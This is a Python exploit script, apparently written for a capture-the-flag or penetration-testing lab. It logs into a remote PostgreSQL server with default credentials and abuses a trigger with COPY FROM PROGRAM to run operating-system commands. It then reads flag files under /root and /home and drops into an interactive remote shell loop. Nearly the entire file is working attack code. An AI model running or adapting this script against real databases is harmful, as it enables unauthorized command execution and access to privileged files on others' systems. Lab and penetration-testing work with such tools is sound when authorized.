import psycopg2
import sys

def psql_exec(cur, cmd):
    ###Creating Table for Command Trigger
    cur.execute("""CREATE TABLE IF NOT EXISTS trigger_test (
        tt_id serial PRIMARY KEY,
        command_output text
    );""")
    cur.execute("TRUNCATE TABLE trigger_test;")

    #Creating Function
    try:
        cur.execute(f"""CREATE OR REPLACE FUNCTION trigger_test_execute_command()
        RETURNS TRIGGER
        LANGUAGE plpgsql
        AS $BODY$
        BEGIN
        COPY trigger_test (command_output) FROM PROGRAM '{cmd}';
        RETURN NULL;
        END;
        $BODY$;
        """)
    except ExternalRoutineException:
        print("Permission Denied: Create Function")

    #Reading table content
    cur.execute("""CREATE TABLE IF NOT EXISTS trigger_test_source (
        s_id integer PRIMARY KEY
    );""")

    #Execute Trigger (Run command)
    cur.execute("""DROP TRIGGER IF EXISTS tr_trigger_test_execute_command on trigger_test_source""")
    cur.execute("""CREATE TRIGGER tr_trigger_test_execute_command
        AFTER INSERT
        ON trigger_test_source
        FOR EACH STATEMENT
        EXECUTE PROCEDURE trigger_test_execute_command();""")

    #Send value to table
    cur.execute("TRUNCATE TABLE trigger_test_source;")
    try:
        cur.execute("INSERT INTO trigger_test_source VALUES (2);")
        cur.execute("TABLE trigger_test;")

        #Output value
        row = cur.fetchone()
        output = []
        while row is not None:
            output.append(row[1])
            row = cur.fetchone()
        return "\n".join(output)
    except psycopg2.errors.ExternalRoutineException:
        print("Permission Denied: trigger_test_source")
        try:
            cur.execute("TRUNCATE TABLE trigger_test_source;")
        except psycopg2.errors.InFailedSqlTransaction:
            cur.execute("ROLLBACK")
    except psycopg2.errors.BadCopyFileFormat:
        #It seems files like /etc/crontab have trouble parsing the data into the Psql Database
        print("TODO: Execute the command piped into base64, then base64 decode")
        cur.execute("ROLLBACK")


if __name__ == "__main__":

    rhost = "" #Remote host IP
    rport = 5432 #Remote host PORT
    user = "postgres" #Postgres user (Default: postgres)
    password = "postgres" #Postgres password (Default: postgres)
    database = "postgres" #Postgres Database (Default: postgres)

    ###Connecting to Database
    print("Connecting to Database...")
    try:
        conn = psycopg2.connect(
            host=rhost,
            database=database,
            user=user,
            password=password,
            port=rport, connect_timeout=5)
        cur = conn.cursor()
    except psycopg2.OperationalError as e:
        print(f"Connection failed: {e}")
        sys.exit()
    print("Connection successful!")

    try:
        try:
            id_cmd = psql_exec(cur, "id")
            root_flag = psql_exec(cur, "cat /root/proof.txt")
            user_flag = psql_exec(cur, "cat /home/thesplodge/local.txt")
            print(id_cmd)
            print(f"User Flag: {user_flag}")
            print(f"Root Flag: {root_flag}")
        except:
            print("Command execution does not seem to work")
        while True:
            cmd = input("Shell -> ")
            print(psql_exec(cur, cmd))
            print() 

    except KeyboardInterrupt:
        # quit
        print()
        print("Exiting...")
        sys.exit()
